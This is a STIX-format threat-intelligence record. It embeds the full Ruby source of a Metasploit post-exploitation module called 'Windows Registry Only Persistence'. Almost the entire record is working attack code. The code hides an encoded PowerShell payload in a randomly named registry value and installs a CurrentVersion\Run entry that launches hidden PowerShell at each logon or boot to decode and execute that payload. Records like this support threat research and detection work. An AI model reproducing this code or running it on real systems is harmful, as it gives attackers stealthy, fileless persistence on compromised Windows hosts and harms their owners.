{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bf7dd50b-c38b-41fa-bab6-837e8a46a024",
    "created": "2024-08-14T16:49:34.913909Z",
    "modified": "2024-08-14T16:49:34.913913Z",
    "name": "Windows Registry Only Persistence",
    "description": " This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in \"CurrentVersion\\Run\" (depending on privilege and selected method). The payload will be installed completely in registry.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/registry_persistence.rb",
            "external_id": "registry_persistence.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Powershell\n  include Msf::Post::Windows::Registry\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Windows Registry Only Persistence',\n      'Description'    => %q{\n        This module will install a payload that is executed during boot.\n        It will be executed either at user logon or system startup via the registry\n        value in \"CurrentVersion\\Run\" (depending on privilege and selected method).\n        The payload will be installed completely in registry.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Donny Maasland <donny.maasland[at]fox-it.com>',\n        ],\n      'Platform'       => [ 'win' ],\n      'SessionTypes'   => [ 'meterpreter', 'shell' ],\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-07-01',\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => true\n        }\n    ))\n\n    register_options([\n      OptEnum.new('STARTUP',\n        [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM']]),\n      OptString.new('BLOB_REG_KEY',\n        [false, 'The registry key to use for storing the payload blob. (Default: random)' ]),\n      OptString.new('BLOB_REG_NAME',\n        [false, 'The name to use for storing the payload blob. (Default: random)' ]),\n      OptString.new('RUN_NAME',\n        [false, 'The name to use for the \\'Run\\' key. (Default: random)' ]),\n      OptBool.new('CREATE_RC',\n        [false, 'Create a resource file for cleanup', true]),\n      OptInt.new('SLEEP_TIME',\n        [false, 'Amount of time to sleep (in seconds) before executing payload. (Default: 0)', 0]),\n    ])\n  end\n\n  def generate_payload_blob\n    opts = {\n      wrap_double_quotes: true,\n      encode_final_payload: true,\n    }\n    blob = cmd_psh_payload(payload.encoded,payload_instance.arch.first, opts).split(' ')[-1]\n    return blob\n  end\n\n  def generate_cmd(root_path, blob_key_name, blob_key_reg)\n    cmd = \"%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c \\\"sleep #{datastore['SLEEP_TIME']}; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item '#{root_path}:#{blob_key_name}').GetValue('#{blob_key_reg}'))))\\\"\"\n    return cmd\n  end\n\n  def generate_blob_reg\n    blob_reg_key = datastore['BLOB_REG_KEY'] || \"Software\\\\#{Rex::Text.rand_text_alphanumeric(8)}\"\n    blob_reg_name = datastore['BLOB_REG_NAME'] || Rex::Text.rand_text_alphanumeric(8)\n    return blob_reg_key, blob_reg_name\n  end\n\n  def generate_cmd_reg\n    cmd_reg = datastore['RUN_NAME'] || Rex::Text.rand_text_alphanumeric(8)\n    return cmd_reg\n  end\n\n  def install_blob(root_path, blob, blob_reg_key, blob_reg_name)\n    blob_reg_key = \"#{root_path}\\\\#{blob_reg_key}\"\n    new_key = false\n    if not registry_enumkeys(blob_reg_key)\n      unless registry_createkey(blob_reg_key)\n        fail_with(Failure::Unknown,\"Failed to create key #{blob_reg_key}\")\n      end\n      print_good(\"Created registry key #{blob_reg_key}\")\n      new_key = true\n    end\n\n    unless registry_setvaldata(blob_reg_key, blob_reg_name, blob, \"REG_SZ\")\n      fail_with(Failure::Unknown,'Failed to open the registry key for writing')\n    end\n    print_good(\"Installed payload blob to #{blob_reg_key}\\\\#{blob_reg_name}\")\n    return new_key\n  end\n\n  def install_cmd(cmd, cmd_reg, root_path)\n    unless registry_setvaldata(\"#{root_path}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\", cmd_reg, cmd, 'REG_EXPAND_SZ')\n      fail_with(Failure::Unknown,'Could not install run key')\n    end\n    print_good(\"Installed run key #{root_path}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\#{cmd_reg}\")\n  end\n\n  def get_root_path\n    if datastore['STARTUP'] == 'USER'\n      root_path = 'HKCU'\n    else\n      root_path = 'HKLM'\n    end\n    return root_path\n  end\n\n  def log_file(log_path = nil) # Thanks Meatballs for this\n    # Get hostname\n    host = session.session_host\n\n    # Create Filename info to be appended to downloaded files\n    filenameinfo = \"_\" + ::Time.now.strftime(\"%Y%m%d.%M%S\")\n\n    # Create a directory for the logs\n    if log_path\n      logs = ::File.join(log_path, 'logs', 'persistence',\n      Rex::FileUtils.clean_path(host + filenameinfo))\n    else\n      logs = ::File.join(Msf::Config.log_directory, 'persistence',\n      Rex::FileUtils.clean_path(host + filenameinfo))\n    end\n\n    # Create the log directory\n    ::FileUtils.mkdir_p(logs)\n\n    # logfile name\n    logfile = ::File.join(logs, Rex::FileUtils.clean_path(host + filenameinfo) + '.rc')\n    logfile\n  end\n\n  def create_cleanup(root_path, blob_reg_key, blob_reg_name, cmd_reg, new_key) # Thanks Meatballs for this\n    clean_rc = log_file()\n    @clean_up_rc = \"\"\n    @clean_up_rc << \"reg deleteval -k '#{root_path}\\\\#{blob_reg_key}' -v '#{blob_reg_name}'\\n\"\n    if new_key\n      @clean_up_rc << \"reg deletekey -k '#{root_path}\\\\#{blob_reg_key}'\\n\"\n    end\n    @clean_up_rc << \"reg deleteval -k '#{root_path}\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -v '#{cmd_reg}'\\n\"\n    file_local_write(clean_rc, @clean_up_rc)\n    print_status(\"Clean up Meterpreter RC file: #{clean_rc}\")\n\n    report_note(:host => session.session_host,\n      type: 'host.persistance.cleanup',\n      data:  {\n        local_id:     session.sid,\n        stype:        session.type,\n        desc:         session.info,\n        platform:     session.platform,\n        via_payload:  session.via_payload,\n        via_exploit:  session.via_exploit,\n        created_at:   Time.now.utc,\n        commands:     @clean_up_rc\n      }\n    )\n  end\n\n  def check\n    unless registry_enumkeys(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\\").include?(\"PowerShell\")\n      return Msf::Exploit::CheckCode::Safe\n    end\n    return Msf::Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n    unless registry_enumkeys(\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\\").include?(\"PowerShell\")\n      print_warning('Warning: PowerShell does not seem to be available, persistence might fail')\n    end\n\n    print_status('Generating payload blob..')\n    blob = generate_payload_blob\n    print_good(\"Generated payload, #{blob.length} bytes\")\n\n    root_path = get_root_path\n    print_status(\"Root path is #{root_path}\")\n\n    blob_reg_key, blob_reg_name = generate_blob_reg\n    cmd = generate_cmd(root_path, blob_reg_key, blob_reg_name)\n    cmd_reg = generate_cmd_reg\n\n    print_status('Installing payload blob..')\n    new_key = install_blob(root_path, blob, blob_reg_key, blob_reg_name)\n\n    print_status('Installing run key')\n    install_cmd(cmd, cmd_reg, root_path)\n\n    if datastore['CREATE_RC']\n      create_cleanup(root_path, blob_reg_key, blob_reg_name, cmd_reg, new_key)\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2015-07-01",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}